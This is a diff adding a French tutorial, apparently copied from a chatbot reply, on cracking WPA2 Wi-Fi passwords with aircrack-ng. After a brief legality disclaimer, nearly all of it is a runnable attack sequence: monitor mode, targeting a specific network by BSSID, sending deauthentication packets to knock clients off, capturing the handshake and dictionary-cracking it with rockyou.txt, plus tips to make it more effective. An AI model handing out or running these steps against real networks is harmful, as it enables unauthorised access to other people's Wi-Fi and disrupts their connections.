@@ -1,0 +1,126 @@
+📡 Tuto Capture et Crack WPA2 avec aircrack-ng (interface wlan0)
+⚠️ Avertissement
+Ce tuto est uniquement à but pédagogique sur tes propres réseaux ou avec l’accord explicite du propriétaire. Pirater un réseau sans autorisation est illégal.
+
+🛠️ Prérequis
+Kali Linux (ou une distro Linux avec aircrack-ng installé)
+
+Carte WiFi compatible en mode monitor (interface wlan0)
+
+Liste de mots de passe (ex: rockyou.txt)
+
+Droits root (sudo)
+
+Étape 1 : Mettre la carte WiFi en mode monitor
+bash
+Copier
+Modifier
+sudo ip link set wlan0 down
+sudo iw dev wlan0 set type monitor
+sudo ip link set wlan0 up
+On passe l’interface wlan0 en mode monitor (écoute passive)
+
+Vérifie avec :
+
+bash
+Copier
+Modifier
+iwconfig
+Tu dois voir wlan0 en mode Monitor.
+
+Étape 2 : Scanner les réseaux WiFi autour
+bash
+Copier
+Modifier
+sudo airodump-ng wlan0
+Repère le réseau cible (BSSID) et note le canal (CH) et le nom du réseau (ESSID)
+
+Exemple :
+
+ruby
+Copier
+Modifier
+BSSID              PWR  CH  ESSID
+CC:32:E5:CB:27:89  -29  11  Starlink_privée
+Étape 3 : Capter les handshakes (captures des paquets)
+Lance la capture ciblée sur le réseau et son canal :
+
+bash
+Copier
+Modifier
+sudo airodump-ng --bssid CC:32:E5:CB:27:89 -c 11 -w capture wlan0
+--bssid : cible le réseau
+
+-c : canal du réseau
+
+-w capture : sauvegarde dans un fichier capture-01.cap
+
+Laisse tourner la commande.
+
+Étape 4 : Forcer la déconnexion des clients pour récupérer le handshake
+Dans un autre terminal, envoie des paquets de déauthentification pour forcer les clients à se reconnecter (et capturer le handshake) :
+
+bash
+Copier
+Modifier
+sudo aireplay-ng --deauth 10 -a CC:32:E5:CB:27:89 wlan0
+--deauth 10 : envoie 10 paquets de deauth
+
+-a : adresse MAC du routeur (BSSID)
+
+wlan0 : interface en mode monitor
+
+Étape 5 : Vérifier la capture du handshake
+Retourne dans le terminal avec airodump-ng et regarde la ligne en haut :
+
+ruby
+Copier
+Modifier
+WPA handshake: CC:32:E5:CB:27:89
+Si tu vois ça, tu as le handshake !
+
+Étape 6 : Cracker le mot de passe avec aircrack-ng
+Maintenant que tu as le fichier de capture, utilise la liste de mots de passe rockyou.txt :
+
+bash
+Copier
+Modifier
+sudo aircrack-ng -w /home/kali/Downloads/rockyou.txt /home/kali/capture-01.cap
+-w : chemin vers la liste de mots de passe
+
+fichier de capture .cap
+
+Étape 7 : Résultat
+Si le mot de passe est dans la liste, aircrack-ng l’affichera.
+
+Sinon, essaie une autre liste ou attends un autre handshake.
+
+Bonus : Conseils utiles 💡
+Plus de clients connectés = plus de chances d’avoir un handshake
+
+Si possible, cible un client précis avec -c MAC_client dans aireplay-ng pour être plus efficace
+
+Utilise une bonne liste de mots de passe (ex: rockyou.txt, darkc0de.lst)
+
+Patience, ça peut prendre du temps selon la taille de ta liste et la puissance de ta machine
+
+Exemple complet
+bash
+Copier
+Modifier
+# Mode monitor
+sudo ip link set wlan0 down
+sudo iw dev wlan0 set type monitor
+sudo ip link set wlan0 up
+
+# Scanner les réseaux
+sudo airodump-ng wlan0
+
+# Capture sur la cible
+sudo airodump-ng --bssid CC:32:E5:CB:27:89 -c 11 -w capture wlan0
+
+# Envoi de déauth
+sudo aireplay-ng --deauth 10 -a CC:32:E5:CB:27:89 wlan0
+
+# Une fois le handshake capturé, cracker
+sudo aircrack-ng -w /home/kali/Downloads/rockyou.txt capture-01.cap
